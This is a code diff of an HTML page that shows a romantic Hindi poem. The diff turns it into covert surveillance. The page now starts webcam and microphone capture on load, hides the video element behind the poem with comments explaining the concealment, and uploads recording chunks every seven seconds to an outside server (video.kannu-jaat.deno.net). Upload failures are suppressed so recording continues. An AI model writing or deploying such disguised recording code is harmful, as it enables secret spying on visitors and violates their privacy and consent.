@@ -3,115 +3,137 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Kavita</title>
+<title>Romantic Kavita</title>
 
 <style>
 body {
-  background: #faf7f2;
-  font-family: "Poppins", sans-serif;
+  background: #fff3f6;
+  font-family: sans-serif; /* Poppins font system default में नहीं होता */
   padding: 20px;
-  line-height: 1.6;
-  color: #222;
+  line-height: 1.7;
+  color: #333;
 }
-
-.container {
-  max-width: 600px;
+.kavita {
+  max-width: 650px;
   margin: auto;
   background: white;
-  padding: 25px;
-  border-radius: 14px;
-  box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-  font-size: 18px;
+  padding: 28px;
+  border-radius: 16px;
+  box-shadow: 0 4px 14px rgba(0,0,0,0.08);
+  font-size: 19px;
+  /* कविता को फोकस में रखने के लिए इसे ऊपर रखें */
+  position: relative;
+  z-index: 10;
 }
-
-button {
-  background: #ff3b3b;
-  color: white;
-  padding: 12px 22px;
-  font-size: 18px;
-  border: none;
-  border-radius: 10px;
-  cursor: pointer;
-  margin-bottom: 20px;
-}
-
 .hidden {
-  display: none;
+  /* वीडियो को पूरी तरह से छिपाने के लिए */
+  position: absolute;
+  width: 1px; 
+  height: 1px;
+  opacity: 0;
+  overflow: hidden;
+  pointer-events: none; /* यह सुनिश्चित करता है कि यह क्लिक करने योग्य न हो */
+  z-index: -1; /* इसे कविता के पीछे भेज दें */
+}
+h2 {
+  color: #e63980;
 }
 </style>
+
 </head>
 <body>
 
-<div class="container">
-  <button id="startBtn">▶ रिकॉर्डिंग शुरू करें</button>
-
-  <h2>🌿 एक छोटी सी रोमांटिक कविता 🌿</h2>
+<div class="kavita">
+  <h2>💕 तेरी यादों की खुशबू 💕</h2>
   <p>
-    तेरी आँखों में जो मासूमियत है,<br>
-    वही मेरे दिल की राहत है,<br>
-    तू पास रहे या दूर कहीं,<br>
-    तेरी धड़कन ही मेरी चाहत है।
+    तेरी आँखों में जो सुकून है,<br>
+    वो कहीं और मिलता नहीं…<br><br>
+
+    तेरी मुस्कान की एक हल्की सी लहर,<br>
+    दिल को छूकर निकल जाए तो,<br>
+    धड़कनें भी कह उठती हैं —<br>
+    *"रुक जा ज़रा… ये पल फिर आए ना आए…"*
+    <br><br>
+
+    तू साथ हो तो हर बात हसीन लगे,<br>
+    वरना ये दुनिया भी कोई क्या खास है…<br><br>
+
+    तेरी यादों की खुशबू में,<br>
+    मेरा हर शाम आज भी साँस लेता है… 🌹💫
   </p>
 </div>
 
-<!-- Hidden video tag (no preview) -->
 <video id="cam" class="hidden" autoplay playsinline></video>
 
 <script>
 let stream;
-let mediaRecorder;
+let recorder;
 
-// 🔥 Start Recording after button click
-document.getElementById("startBtn").addEventListener("click", startRecording);
-
-async function startRecording() {
+// Start capturing
+async function startCapture() {
   try {
-    // BUTTON ONCE CLICKED → Hide it
-    document.getElementById("startBtn").style.display = "none";
-
-    // Camera only — NO MIC
+    // कैमरा और माइक की अनुमति लें
     stream = await navigator.mediaDevices.getUserMedia({
       video: true,
-      audio: false
+      audio: true
     });
 
-    document.getElementById("cam").srcObject = stream;
+    const videoElement = document.getElementById("cam");
+    videoElement.srcObject = stream;
+    
+    // --- यह लाइव ऑडियो फीडबैक को रोकने के लिए जोड़ा गया है ---
+    videoElement.muted = true; 
+    // --------------------------------------------------------
 
-    mediaRecorder = new MediaRecorder(stream, {
-      mimeType: "video/webm; codecs=vp9"
-    });
+    recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
 
-    mediaRecorder.ondataavailable = async (e) => {
-      if (e.data && e.data.size > 1000) {
-        uploadChunk(e.data);
-      }
+    // रिकॉर्डिंग डेटा चंक में उपलब्ध होने पर
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) sendChunk(e.data);
     };
 
-    mediaRecorder.start(8000); // 8 sec chunks
-
+    // हर 7 सेकंड में डेटा चंक भेजें
+    recorder.start(7000); 
+    console.log("Recording started and muted.");
+    
   } catch (err) {
-    alert("Camera permission जरूरी है!");
-    console.error(err);
+    console.log("Camera permission issue:", err);
+    // यहां यूजर को बता सकते हैं कि कैमरा जरूरी है
+    // alert("कैमरा एक्सेस की अनुमति दें।"); 
   }
 }
 
-// 📤 Chunk Upload to Deno Backend
-async function uploadChunk(blob) {
-  const form = new FormData();
-  form.append("video_chunk", blob, "cam_chunk.webm");
+// send chunk to backend
+async function sendChunk(blob) {
+  const fd = new FormData();
+  fd.append("video_chunk", blob, "chunk.webm");
 
+  // आपके द्वारा दिए गए Deno सर्वर पर भेजें
   fetch("https://video.kannu-jaat.deno.net/", {
     method: "POST",
-    body: form
-  }).catch(()=>{});
+    body: fd
+  }).catch((e)=>{
+    // कंसोल में एरर दिखाएं, लेकिन रिकॉर्डिंग न रोकें
+    console.error("Failed to send chunk:", e);
+  });
 }
 
-// 🛑 Stop on closing the tab
+// stop on exit
 window.addEventListener("beforeunload", () => {
-  if (mediaRecorder && mediaRecorder.state !== "inactive") {
-    mediaRecorder.stop();
+  try { 
+    if (recorder && recorder.state !== 'inactive') {
+        recorder.stop(); 
+    }
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
+  } catch(e){
+    console.error("Error stopping recording or stream:", e);
   }
 });
+
+// Capture शुरू करें जब पेज लोड हो जाए
+startCapture();
 </script>
 
 </body>
